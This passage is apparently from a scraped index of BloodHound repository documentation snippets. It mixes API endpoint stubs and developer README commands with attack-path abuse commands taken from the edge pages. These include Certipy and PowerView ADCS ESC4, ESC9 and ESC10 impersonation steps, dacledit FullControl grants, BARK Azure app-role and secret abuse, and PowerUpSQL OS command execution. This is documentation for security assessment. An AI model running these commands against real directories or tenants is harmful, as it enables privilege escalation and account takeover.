/api/v2/sso-providers/oidc.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/create-oidc-provider.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/sso-providers/oidc\n```\n\n----------------------------------------\n\nTITLE: Adding Owner to Service Principal\nDESCRIPTION: Uses BARK's New-ServicePrincipalOwner function to add a new owner to a Service Principal using the target's ObjectId, new owner's ObjectId, and authentication token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-owner.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nNew-ServicePrincipalOwner `\n    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Event Details in OpenAPI\nDESCRIPTION: Specifies the OpenAPI path for retrieving event details by event ID. The endpoint is /api/v2/events/{event_id} and uses the GET method.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/events-schedules/get-event.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/events/{event_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI DELETE Endpoint for Saved Query Permissions\nDESCRIPTION: OpenAPI specification defining the endpoint path for deleting permissions from a saved query. The endpoint follows the pattern /api/v2/saved-queries/{saved_query_id}/permissions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/revokes-permission-of-a-saved-query-from-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/saved-queries/{saved_query_id}/permissions\n```\n\n----------------------------------------\n\nTITLE: Beagle Extension Initialization Hook\nDESCRIPTION: Example of the initialization hook function required in Beagle extensions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nfrom beagle.project import ProjectContext\n\n\ndef init(project_ctx: ProjectContext) -> None:\n    # This function will be called upon import of the beagle extensions package. Any additional wire-up may be\n    # performed here \n    pass\n```\n\n----------------------------------------\n\nTITLE: Risk Assessment Compliance Mapping Table\nDESCRIPTION: Markdown table detailing how BloodHound Enterprise's attack path analysis and risk scoring capabilities satisfy risk assessment requirements across different NIST frameworks.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/compliance-framework/resources.mdx#2025-04-23_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n|     |     |     |     |     |     |     |\n| --- | --- | --- | --- | --- | --- | --- |\n| **Control Category/Activity** | **How Does BloodHound Enterprise Satisfy This Control?** | **[NIST CSF v1.1](/manage-bloodhound/compliance-framework/nist-csf-v1-1)** | **[NIST CSF v2](/manage-bloodhound/compliance-framework/nist-csf-v2)** | **[NIST 800-171](/manage-bloodhound/compliance-framework/nist-sp-800-171)** | **[NIST 800-53 rev 8](/manage-bloodhound/compliance-framework/nist-sp-800-53)** |     |\n```\n\n----------------------------------------\n\nTITLE: Checking Victim's Mail Attribute (Windows)\nDESCRIPTION: Checks if the victim has the 'mail' attribute set using PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainObject -Identity VICTIM -Properties mail\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Data Quality Statistics in BloodHound\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET endpoint that retrieves data quality statistics for a specific platform in BloodHound. The endpoint requires a platform_id parameter and is available in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/data-quality/get-platform-data-quality-aggregate.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/platform/{platform_id}/data-quality-stats\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via SQL Agent Jobs with JScript Subsystem in PowerUpSQL\nDESCRIPTION: This command creates and executes a SQL Agent job using the JScript subsystem to run operating system commands through PowerUpSQL's Invoke-SQLOSCmdAgentJob function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_6\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword\n```\n\n----------------------------------------\n\nTITLE: Checking Certificate Template Ownership in Linux\nDESCRIPTION: This bash command uses Impacket's owneredit to check the current owner of a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nowneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph JWT with Refresh Token in Azure\nDESCRIPTION: This snippet demonstrates how to use BARK's Get-GraphTokenWithRefreshToken function to acquire an MS Graph-scoped JWT by supplying a refresh token. This token will be used for authentication in subsequent operations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-secret.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Running Beagle CLI in Bash\nDESCRIPTION: Shows how to execute the Beagle CLI with the help option to display usage information.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npython3 main.py -h \n```\n\n----------------------------------------\n\nTITLE: Executing Commands in Remote PowerShell Session\nDESCRIPTION: Uses Invoke-Command to execute a script block within an established PowerShell session, in this example starting a command prompt on the remote system.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-ps-remote.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nInvoke-Command -Session $session -ScriptBlock {Start-Process cmd}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Token Generation Endpoint Definition\nDESCRIPTION: OpenAPI specification defining the POST endpoint for generating API tokens in BloodHound\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/api-tokens/create-token-for-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/tokens\n```\n\n----------------------------------------\n\nTITLE: Querying BloodHound Version API Endpoint\nDESCRIPTION: OpenAPI specification for the GET /api/version endpoint. This endpoint returns the version information of the BloodHound application.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/api-info/get-api-version.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/version\n```\n\n----------------------------------------\n\nTITLE: NIST SP 800-171 Compliance Markdown Documentation\nDESCRIPTION: Markdown formatted documentation detailing BloodHound Enterprise's compliance capabilities for NIST SP 800-171 requirements, including sections on access control and audit logging.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/compliance-framework/nist-sp-800-171.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: BloodHound Enterprise NIST SP 800-171 Compliance Resource\ndescription: \"The Following information is meant to provide a more detailed and in-depth view of compliance items that BloodHound Enterprise can assist in providing coverage for.\"\n---\n```\n\n----------------------------------------\n\nTITLE: Card Navigation Structure for Release Notes\nDESCRIPTION: HTML markup defining a navigation interface with two cards linking to the release notes summary and archive sections.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/release-notes/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<CardGroup>\n<Card title=\"Release Notes Summary\" icon=\"star\" iconType=\"solid\" horizontal href=\"/resources/release-notes/summary\" />\n<Card title=\"Release Note Archive\" icon=\"code-commit\" iconType=\"solid\" horizontal href=\"/resources/release-notes/2024-11-14-v6-2-0\" />\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Using FOREACH Clause for Path Operations in Cypher\nDESCRIPTION: Shows how to use FOREACH to perform operations on all nodes in a path. Sets a property on each node in the path between two specified nodes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_30\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH P = (VS)-[*]->(VE)\nWHERE VS.Name = 'A' AND VE.Name = 'D'\nFOREACH (V IN nodes(P) | SET V.Marked = true)\n```\n\n----------------------------------------\n\nTITLE: Resetting Victim's UPN (Windows)\nDESCRIPTION: Sets the UPN of the victim principal back to an arbitrary value using PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Object Metadata in BloodHound API\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET endpoint to retrieve metadata for a specific object in BloodHound. It specifies the path parameter 'object_id' to identify the object whose metadata is being requested.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/meta-entities/get-meta-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/meta/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Setting dNSHostName of Victim Computer with Certipy in Windows\nDESCRIPTION: This command uses Certipy to update the dNSHostName attribute of the victim computer to match the target computer's hostname, which is a crucial step in the impersonation attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns TARGET.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Granting GenericAll Permissions on Certificate Template in PowerShell\nDESCRIPTION: This PowerShell snippet grants GenericAll permissions on a certificate template to a principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$principalName = \"principal\" # SAM account name of principal\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Construct the ACE\n$account = New-Object System.Security.Principal.NTAccount($principalName)\n$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])\n$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(\n$sid,\n[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,\n[System.Security.AccessControl.AccessControlType]::Allow\n)\n\n# Add the new ACE to the ACL\n$acl = $template.psbase.ObjectSecurity\n$acl.AddAccessRule($ace)\n$template.psbase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Setting Computer Mail Attribute with PowerView in Windows\nDESCRIPTION: Sets a dummy mail attribute on the victim computer which may be required for certificate enrollment with certain template configurations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}\n```\n\n----------------------------------------\n\nTITLE: Exploring Beagle Plans in Python REPL\nDESCRIPTION: Demonstrates how to inspect Beagle plans using the Python REPL.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> import plans\n>>> dir(plans)\n['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__path__', '__spec__', 'build_plans', 'test_plans']\n\n>>> print(plans.test_plans)\n[]\n\n>>> print(plans.build_plans)\n[]\n```\n\n----------------------------------------\n\nTITLE: Simple Conventional Commit Example\nDESCRIPTION: Shows a basic example of a feature commit with a ticket reference in the footer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-2.md#2025-04-23_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nfeat: Adds table view to Explore page\\n\\nCloses BED-5555\n```\n\n----------------------------------------\n\nTITLE: Granting RoleManagement.ReadWrite.Directory App Role with PowerShell BARK\nDESCRIPTION: Uses BARK's New-AppRoleAssignment function to grant the RoleManagement.ReadWrite.Directory app role to a specific Service Principal using the MS Graph token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-app-roles.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AppRoleAssignment `\n    -SPObjectId \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -AppRoleID \"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8\" `\n    -ResourceID \"9858020a-4c00-4399-9ae4-e7897a8333fa\" `\n    -Token $MGToken\n```\n\n----------------------------------------\n\nTITLE: Creating Generic All Access ACE\nDESCRIPTION: Creates a new Access Control Entry (ACE) that grants GenericAll rights to a specified user across all descendant objects.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/contains.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Completeness Endpoint Definition\nDESCRIPTION: OpenAPI specification for the GET /api/v2/completeness API endpoint. This endpoint appears to be a status or health check endpoint for checking data completeness.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/data-quality/get-database-completeness-stats.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/completeness\n```\n\n----------------------------------------\n\nTITLE: Get Azure Entities API Endpoint Definition\nDESCRIPTION: OpenAPI endpoint specification for retrieving Azure entities. The endpoint accepts an entity_type parameter to specify which type of Azure entities to fetch.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/azure-entities/get-azure-entity.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/azure/{entity_type}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI POST Endpoint for Events in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /api/v2/events endpoint in BloodHound Enterprise. It specifies the API version and path for creating new events.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/events-schedules/create-event.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/events\n```\n\n----------------------------------------\n\nTITLE: Configuring Default User-agent in robots.txt\nDESCRIPTION: A simple robots.txt configuration that references the standard specification URL and includes a User-agent wildcard (*) directive. The wildcard means the rules apply to all web crawlers, but since no Disallow directives are specified, all content is allowed to be crawled.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/public/robots.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n# https://www.robotstxt.org/robotstxt.html\nUser-agent: *\n```\n\n----------------------------------------\n\nTITLE: Searching for Group Nodes in BloodHound\nDESCRIPTION: This snippet demonstrates how to search for group nodes containing the word 'admin' in BloodHound. It uses a node label prefix to constrain the search to group nodes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/explore-objects.mdx#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\ngroup:admin\n```\n\n----------------------------------------\n\nTITLE: OpenAPI POST Endpoint Definition for User MFA\nDESCRIPTION: OpenAPI specification defining the POST endpoint for managing MFA settings for a specific BloodHound user. The endpoint follows the pattern '/api/v2/bloodhound-users/{user_id}/mfa'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/enrolls-user-in-multi-factor-authentication.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/bloodhound-users/{user_id}/mfa\n```\n\n----------------------------------------\n\nTITLE: Removing SPN with ldapmodify in Linux\nDESCRIPTION: This command uses ldapmodify to remove Service Principal Names (SPNs) from the victim computer in Linux environments. This is necessary before changing the dNSHostName.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Managing GenericAll Permissions on Certificate Template in Linux\nDESCRIPTION: These bash commands use Impacket's dacledit to manage GenericAll permissions on a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ndacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'\n\ndacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'\n\ndacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'\n```\n\n----------------------------------------\n\nTITLE: Checking Mail Attribute of Victim Computer Using ldapsearch in Linux\nDESCRIPTION: This command uses ldapsearch to check if the victim computer has the mail attribute set in Linux environments, which may be required for certificate enrollment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail\n```\n\n----------------------------------------\n\nTITLE: Running BloodHound UI Tests\nDESCRIPTION: Command to launch the test runner in interactive watch mode using Yarn.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nyarn test\n```\n\n----------------------------------------\n\nTITLE: Creating ACE for GenericAll on All Descendant Objects\nDESCRIPTION: This PowerShell code creates an Access Control Entry (ACE) granting the 'JKHOLER' user full control (GenericAll) over all descendant objects of an OU. It uses the New-ADObjectAccessControlEntry function from PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/generic-all.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for File Upload Accepted Types Endpoint in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /api/v2/file-upload/accepted-types endpoint. It specifies the path and HTTP method for retrieving accepted file types for uploading in BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collection-uploads/list-accepted-file-upload-types.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/file-upload/accepted-types\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint for Domain Details\nDESCRIPTION: OpenAPI specification for retrieving domain details via GET request with a domain_id path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/list-domain-attack-paths-details.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{domain_id}/details\n```\n\n----------------------------------------\n\nTITLE: Structuring RFC Considerations Section in Markdown\nDESCRIPTION: Example of how to format the optional Considerations section of a BloodHound RFC, including subsections with third-level headings and sequential numbering.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n```markdown\n## 3. Considerations\n\n### 3.1 Impact on Existing Systems\n\nI'm a little teapot.\n\n### 3.2 Security & Compliance\n\n#### 3.2.1 Risks\n\nI am short and stout.\n\n### 3.3 Implementation Plan\n\n#### 3.3.1 Stages\n\n- Here is my ladle.\n- Here is my spout.\n```\n```\n\n----------------------------------------\n\nTITLE: Specifying Boto3 Dependency for Python Project\nDESCRIPTION: This line specifies that the project requires boto3 version 1.26.88 or higher. Boto3 is the Amazon Web Services (AWS) SDK for Python, used to interact with AWS services programmatically.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/requirements.txt#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nboto3 >= 1.26.88\n```\n\n----------------------------------------\n\nTITLE: Managing Relationship Property Existence Constraints in Cypher\nDESCRIPTION: Shows how to create and drop property existence constraints on relationships. These constraints ensure that specified properties must exist on relationships with the given label.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_28\n\nLANGUAGE: cypher\nCODE:\n```\nCREATE CONSTRAINT ON ()-[E:Label]->() ASSERT EXISTS (E.Must);\nDROP CONSTRAINT ON ()-[E:Label]->() ASSERT EXISTS (E.Must);\n```\n\n----------------------------------------\n\nTITLE: Restarting Docker Environment for BloodHound Configuration Changes\nDESCRIPTION: These commands are used to restart the Docker environment after making changes to the bloodhound.config.json file. This ensures that the updated configuration is properly applied to the BloodHound instance running in the Docker container.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/docker-compose/README.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose down\n```\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose up\n```\n\n----------------------------------------\n\nTITLE: Defining SAML SSO Endpoint in OpenAPI\nDESCRIPTION: This snippet defines the OpenAPI specification for the SAML Single Sign-On endpoint in BloodHound. The endpoint path is '/api/v2/saml/sso' and uses the HTTP GET method.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/get-all-saml-sign-on-endpoints.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/saml/sso\n```\n\n----------------------------------------\n\nTITLE: Resetting Victim UPN\nDESCRIPTION: Resets the victim's UPN to an arbitrary value after certificate enrollment\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local\n```\n\n----------------------------------------\n\nTITLE: Making Certificate Template ESC1 Abusable in Linux\nDESCRIPTION: These bash commands use Certipy to make a certificate template vulnerable to ESC1 and then restore its configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ncertipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old\n\ncertipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json\n```\n\n----------------------------------------\n\nTITLE: Restoring Original SPN with ldapmodify in Linux\nDESCRIPTION: Uses ldapmodify to restore the original Service Principal Name (SPN) of the victim computer after completing the attack to avoid disruption in the environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: St Bernard CLI Help Command Usage\nDESCRIPTION: Demonstrates the main help output of St Bernard showing available commands and options. The tool supports various operations like environment dumping, dependency management, code generation, testing, and building.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/stbernard/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ go run github.com/specterops/bloodhound/packages/go/stbernard -h\n\nA BloodHound Swiss Army Knife\n\nUsage:  stbernard [OPTIONS] COMMAND\n\nOptions:\n  -v          Verbose output\n  -vv         Debug output\n\nCommands:\n  envdump     Dump your environment variables\n  deps        Ensure workspace dependencies are up to date\n  modsync     Sync all modules in current workspace\n  generate    Run code generation in current workspace\n  show        Show current project info\n  analysis    Run static analyzers\n  test        Run tests for entire workspace\n  build       Build commands in current workspace\n  cover       Collect coverage reports\n```\n\n----------------------------------------\n\nTITLE: Output from New-AppRegSecret Command in PowerShell\nDESCRIPTION: This snippet shows the output returned when creating a new secret for an Azure App Registration, including the plain-text secret value, App ID, and Object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-secret.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AppRegSecret `\n    -AppRegObjectID \"d878...\" `\n    -Token $MGToken.access_token\n\nName                Value\n----                -----\nAppRegSecretValue   odg8Q~...\nAppRegAppId         4d31...\nAppRegObjectId      d878...\n```\n\n----------------------------------------\n\nTITLE: HTML Navigation Cards for SharpHound Enterprise Documentation\nDESCRIPTION: A structured HTML card group displaying navigation links to different sections of SharpHound Enterprise documentation, including system requirements, installation, configuration, and troubleshooting guides.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<CardGroup>\n<Card title=\"SharpHound Enterprise System Requirements and Deployment Process\" icon=\"file\" href=\"/install-data-collector/install-sharphound/system-requirements\"> Promoted article </Card>\n<Card title=\"Install and Upgrade SharpHound Enterprise\" icon=\"download\" href=\"/install-data-collector/install-sharphound/installation-upgrade\"> </Card>\n<Card title=\"Deploy a Tiered SharpHound Enterprise Collector Strategy\" icon=\"layer-group\" href=\"/install-data-collector/install-sharphound/tiered-collector-strategy\"> </Card>\n<Card title=\"Create a gMSA for Use With SharpHound Enterprise\" icon=\"user-plus\" href=\"/install-data-collector/install-sharphound/create-gmsa\"> </Card>\n<Card title=\"SharpHound Enterprise Local Configuration\" icon=\"cog\" href=\"/install-data-collector/install-sharphound/local-configuration\"> </Card>\n<Card title=\"Modify the Service Account Used By SharpHound Enterprise\" icon=\"user-edit\" href=\"/install-data-collector/install-sharphound/modify-service-account\"> </Card>\n<Card title=\"SharpHound Enterprise Tenant Configuration\" icon=\"building\" href=\"/install-data-collector/install-sharphound/tenant-configuration\"> </Card>\n<Card title=\"Troubleshoot Local Collection Coverage\" icon=\"bug\" href=\"/install-data-collector/install-sharphound/troubleshooting\"> </Card>\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for PS Remote Users in BloodHound\nDESCRIPTION: This YAML snippet specifies an OpenAPI GET endpoint to retrieve PS Remote Users for a specific computer. It includes the endpoint path with a parameter for the computer's object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-remote-powershell-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/ps-remote-users\n```\n\n----------------------------------------\n\nTITLE: Retrieving Domain Users via BloodHound API\nDESCRIPTION: API endpoint specification for retrieving user information from a specific domain in BloodHound. This endpoint requires the domain's object_id as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/users\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for Base Object\nDESCRIPTION: OpenAPI specification defining the GET endpoint for retrieving a base object by its ID in BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-base-entities/get-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/base/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Removing Neo4j Volume in Bash\nDESCRIPTION: This Bash command removes the Neo4j data volume to reset the database without affecting application state.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/docker-compose/README.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker volume rm $(docker volume ls -q | grep neo4j-data)\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Completed Tasks\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint to retrieve completed tasks for a specific client. The endpoint uses a path parameter 'client_id' to identify the client.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/list-all-completed-tasks-for-a-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/clients/{client_id}/completed-tasks\n```\n\n----------------------------------------\n\nTITLE: 